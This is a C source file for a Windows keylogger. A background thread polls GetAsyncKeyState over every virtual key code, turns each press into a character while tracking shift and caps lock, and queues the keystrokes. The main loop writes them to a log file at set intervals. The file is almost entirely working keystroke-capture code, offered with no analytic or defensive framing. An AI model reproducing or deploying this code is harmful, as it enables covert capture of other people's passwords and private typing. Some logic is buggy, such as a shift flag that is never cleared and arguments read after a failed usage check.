#include "settings.h"

int isAlphabetKey(int key) {
    return (key>=65 && key<=90);
}

int isShiftCombKey(int key) {
    return (key>=48 && key<=57);
}

int isShiftSpecialCombKey1(int key) {
    return (key>=186 && key<=192);
}

int isShiftSpecialCombKey2(int key) {
    return (key>=219 && key<=222);
}

int getKey(struct KeyLogQueue* q, char* key) {
    struct KeyLogNode* currentKey;

    currentKey = DequeueKeyLogNode(q);

    if (currentKey->data != NULL) {
        strcpy(key, currentKey->data);
        free(currentKey);
        currentKey = NULL;
        return 1;
    } return 0;
}

void myKeyLogger (struct KeyLogQueue* q) {

    char* keys[] = {"","<Left-Mouse>;","<Right-Mouse>;","<Cancel>;","<Middle-Mouse>;","<X1-Mouse>;", "<X2-Mouse>;","","<BackSpace>;","	","","","<Clear>;","<Enter>;","","","<Shift>;","<CTRL>;","<ALT>;","<Pause>;","<Caps-Lock>;","<IME-Hangul-Mode>;","","<IME-Junja>;","<IME-Final>;","<IME-Hanja>;","","<ESC>;","<IME-Conver>;","<IME-NonConver>;","<IME-Accept>;","<IME-Mode-Change-Request>;"," ","<Page-Up>;","<Page-Down>;","<End>;","<Home-Key>;","<Left-Arrow>;","<Up-Arrow>;","<Right-Arrow>;","<Down-Arrow>;","<Select>;","<Print-Key>;","<Execute-Key>;","<Print-Screen>;","<INS>;","<Delete>;","<Help>;","0","1","2","3","4","5","6","7","8","9","","","","","","","","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","<Left-Windows-Key>;","<Right-Windows-Key>;","<Application-Key>;","","<Computer-Sleep>;","0","1","2","3","4","5","6","7","8","9","*","+","|","-",".","/","<F1>;","<F2>;","<F3>;","<F4>;","<F5>;","<F6>;","<F7>;","<F8>;","<F9>;","<F10>;","<F11>;","<F12>;","<F13>;","<F14>;","<F15>;","<F16>;","<F17>;","<F18>;","<F19>;","<F20>;","<F21>;","<F22>;","<F23>;","<F24>;","","","","","","","","","<Num-Lock>;",
	"<Scroll-Lock>;","","","","","","","","","","","","","","","","","","<Control>;","<Control>;","<Menue>;","<Menue>;",
	"<Browser Back>;","<Browser Forward>;","<Browser Refresh>;","<Browser Stop>;","<Browser Search>;","<Browser Favorite>;","<Browser Home>;","<Volume Mute>;","<Volume Down>;","<Volume Up>;", "<New Track>;","<Previous Track>;","<Play/Pause>;","<Start Mail>;","<Select Media>;","<Start Application 1>;","<Start Application 2>;",NULL,NULL,";","=",",","-",".","/","`","","","","","","","","","","","","","","","","","","","","","","","","","","","[","\\","]","'","","","","< [ OR / >;","","","<IME-Process>;","","","","","","","","","","","","","","","","<Attn>;", "<CrSel>;","<ExSel>;","<Erase>;","<Play>;","<Zoom>;","","<PA1>;","<Clear>;"};

    int i=1;
    int capsOn = 0; //Cap lock is toogled
	int shiftOn = 0; // Shift is being pressed
	int shiftPressed; // Check if shift is pressed
    char* vKeyCapsAlphabet[] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};
	char* vKeyShiftComb[] = {")","!","@","#","$","%","^","&","*","("};
	char* vKeySpecialShiftComb1[] = {":","+","<","_",">","?","~"};
	char* vKeySpecialShiftComb2[] = {"{","|","}","\""};
    
    while(1) {
        for(i=1; i<255; i++) {
            // GetAsyncKeyState returns -32767 when a key is being held down
            if (GetAsyncKeyState(i) == -32767) {
                
                //caps
                capsOn = GetAsyncKeyState(VK_CAPITAL);
                //shift
                shiftPressed = GetAsyncKeyState(VK_SHIFT);
                if (shiftPressed == -127 || shiftPressed == -128) {
                    shiftOn = 1;
                }
                // capitals
                if ((shiftOn && !capsOn && isAlphabetKey(i)) || (!shiftOn && capsOn && isAlphabetKey(i))) {
                    i-=65;
                    insertKeyLogNode(q, vKeyCapsAlphabet[i]);
                }
                // shift combinations
                else if (shiftOn && isShiftCombKey(i)) {
                    i-=48;
                    insertKeyLogNode(q, vKeyShiftComb[i]);
                }
                // shift special combinations 1
                else if (shiftOn && isShiftSpecialCombKey1(i)) {
                    i-=186;
                    insertKeyLogNode(q, vKeySpecialShiftComb1[i]);
                }
                // shift special combinations 2
                else if (shiftOn && isShiftSpecialCombKey2(i)) {
                    i-=219;
                    insertKeyLogNode(q, vKeySpecialShiftComb2[i]);
                }
                // regular key :)
                else {
                    insertKeyLogNode(q, keys[i]);
                }
            }
        }
    }
    return;
}

DWORD WINAPI myThreadFun(void* arg) {
    struct KeyLogQueue* q = arg;
    myKeyLogger(q);
    return 0;
}

HANDLE startKeyLogger (struct KeyLogQueue* q) {
    HANDLE thread = CreateThread(NULL, 0, myThreadFun, q, 0, NULL);
    return thread;
}


int main(int argc, char* argv[]) {
    if (argc<2) {
        printf("Missing arguments.\nUsage; ./main <file direction> <num of secs>\nIn case you do not want to specify parameters go for: ./main 'default'\n");
    }
    char* dst = (strcmp(argv[1],"default")) ? argv[1] : DEST_FILE;
    int numofsecs = (argv[2]) ? strtol(argv[2],NULL,10) : WAIT_SECS;

    printf("Initialazing....\n");
    printf("Destination path: %s\n", dst);
    printf("Number of seconds in pauses: %d\n", numofsecs);
    
    struct KeyLogQueue* q = createKeyLogQueue();
    startKeyLogger(q);
    int firstCall = 1;

    while(1) {
            if (q->first->data != NULL) {
                write_file(dst, q, firstCall);
                firstCall=0;
            }
        // sleep reduces CPU usage (and keyloggers efectiveness aswell)
        Sleep(numofsecs*1000);
    }
    
    return 0;
}
